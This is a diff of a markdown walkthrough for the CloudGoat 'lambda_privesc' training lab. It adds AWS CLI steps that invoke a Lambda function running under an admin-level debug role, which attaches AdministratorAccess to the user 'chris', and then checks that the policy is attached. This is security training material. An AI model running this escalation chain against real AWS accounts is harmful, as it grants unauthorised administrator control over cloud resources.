@@ -117,11 +117,22 @@ ATTACHEDPOLICIES        arn:aws:iam::aws:policy/AdministratorAccess     Administ
 Thus, we can create a lambda function passing the debug role with full administration access.
 
 ## Craft Lambda Function
-1. Copy lambda.py and replace corresponding variables
+1. Copy lambda.py and replace corresponding variables. The lambda function should add the administrator access permission to chris.
 2. Zip the file 
 3. Create the function
 ```
 aws lambda create-function --function-name lambda_privilege_escalate --role <debug role arn> --runtime python3.9 --profile manager --handler lambda.lambda_handler --zip-file <path to lambda.py.zip>
 ```
+4. Execute function
+```
+aws lambda invoke --function-name lambda_privilege_escalate output.txt --profile manager
+```
+5. Check Permissions for Chris
+```
+aws iam list-attached-user-policies --user-name <chris user name>
+...
+ATTACHEDPOLICIES        arn:aws:iam::aws:policy/AdministratorAccess     AdministratorAccess <- This policy is attached!
+```
+
 ## References 
 https://github.com/RhinoSecurityLabs/cloudgoat/blob/master/scenarios/lambda_privesc/README.md
